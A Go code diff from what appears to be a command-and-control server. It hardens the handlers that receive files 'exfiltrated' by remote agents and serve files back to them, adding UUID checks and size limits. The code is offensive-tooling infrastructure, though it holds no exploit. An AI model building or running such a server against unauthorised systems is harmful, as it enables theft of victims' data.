@@ -2,18 +2,61 @@ package services
 
 import (
 	"fmt"
-	"github.com/gin-gonic/gin"
 	"net/http"
 	"os"
 	"path/filepath"
+	"regexp"
+	"strings"
+
+	"github.com/gin-gonic/gin"
+	"github.com/google/uuid"
+
+	"cupcake-server/pkg/paths"
 )
 
-// Config
-const StoragePath = "./storage/agent_files"
+// MaxAgentUploadBytes is the per-file ceiling for agent exfiltration uploads.
+const MaxAgentUploadBytes int64 = 256 << 20 // 256 MiB
+
+var agentUUIDRe = regexp.MustCompile(`(?i)^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
+
+func transferRoot() string {
+	return paths.Join("agent_files")
+}
 
 func InitTransfer() {
-	// Ensure storage directory exists
-	os.MkdirAll(StoragePath, 0755)
+	os.MkdirAll(transferRoot(), 0755)
+}
+
+// ValidAgentUUID reports whether s is an RFC-4122 UUID string (agent IDs).
+func ValidAgentUUID(s string) bool {
+	s = strings.TrimSpace(s)
+	if s == "" {
+		return false
+	}
+	if !agentUUIDRe.MatchString(s) {
+		return false
+	}
+	_, err := uuid.Parse(s)
+	return err == nil
+}
+
+// ValidateAgentUpload applies UUID + size gates used by HandleAgentUpload.
+// Returns HTTP status and error message; status 0 means OK.
+func ValidateAgentUpload(uuidStr string, size int64) (status int, msg string) {
+	if size < 0 {
+		size = 0
+	}
+	if size > MaxAgentUploadBytes {
+		return http.StatusRequestEntityTooLarge, "file too large"
+	}
+	uuidStr = strings.TrimSpace(uuidStr)
+	if uuidStr == "" {
+		return http.StatusBadRequest, "Agent UUID is required"
+	}
+	if !ValidAgentUUID(uuidStr) {
+		return http.StatusBadRequest, "invalid agent UUID"
+	}
+	return 0, ""
 }
 
 // Handler: Agent Uploads File (Exfiltration)
@@ -26,17 +69,25 @@ func HandleAgentUpload(c *gin.Context) {
 		return
 	}
 
-	uuid := c.PostForm("uuid")
-	if uuid == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent UUID is required"})
+	uuidStr := strings.TrimSpace(c.PostForm("uuid"))
+	if status, msg := ValidateAgentUpload(uuidStr, file.Size); status != 0 {
+		body := gin.H{"error": msg}
+		if status == http.StatusRequestEntityTooLarge {
+			body["max_bytes"] = MaxAgentUploadBytes
+		}
+		c.JSON(status, body)
 		return
 	}
 
 	// 2. Save file directly to disk (Isolated by UUID)
 	filename := filepath.Base(file.Filename)
-	agentDir := filepath.Join(StoragePath, uuid)
+	if filename == "." || filename == ".." || filename == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
+		return
+	}
+	agentDir := filepath.Join(transferRoot(), uuidStr)
 	os.MkdirAll(agentDir, 0755)
-	
+
 	savePath := filepath.Join(agentDir, filename)
 
 	if err := c.SaveUploadedFile(file, savePath); err != nil {
@@ -44,7 +95,17 @@ func HandleAgentUpload(c *gin.Context) {
 		return
 	}
 
-	fmt.Printf("[+] File Received from Agent %s: %s\n", uuid, savePath)
+	// Post-save size re-check (Content-Length may have been wrong)
+	if fi, err := os.Stat(savePath); err == nil && fi.Size() > MaxAgentUploadBytes {
+		_ = os.Remove(savePath)
+		c.JSON(http.StatusRequestEntityTooLarge, gin.H{
+			"error":     "file too large",
+			"max_bytes": MaxAgentUploadBytes,
+		})
+		return
+	}
+
+	fmt.Printf("[+] File Received from Agent %s: %s\n", uuidStr, savePath)
 	c.JSON(http.StatusOK, gin.H{"status": "success", "path": savePath})
 }
 
@@ -52,18 +113,22 @@ func HandleAgentUpload(c *gin.Context) {
 // GET /api/transfer/download/:filename
 func HandleAgentDownload(c *gin.Context) {
 	filename := filepath.Base(c.Param("filename"))
-	uuid := c.Query("uuid") // Expect UUID for isolation
-	
+	uuidStr := c.Query("uuid") // Expect UUID for isolation
+
 	if filename == "." || filename == ".." || filename == "" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
 		return
 	}
-	
+
 	targetPath := ""
-	if uuid != "" {
-		targetPath = filepath.Join(StoragePath, uuid, filename)
+	if uuidStr != "" {
+		if !ValidAgentUUID(uuidStr) {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid agent UUID"})
+			return
+		}
+		targetPath = filepath.Join(transferRoot(), uuidStr, filename)
 	} else {
-		targetPath = filepath.Join(StoragePath, filename)
+		targetPath = filepath.Join(transferRoot(), filename)
 	}
 
 	// Check if file exists
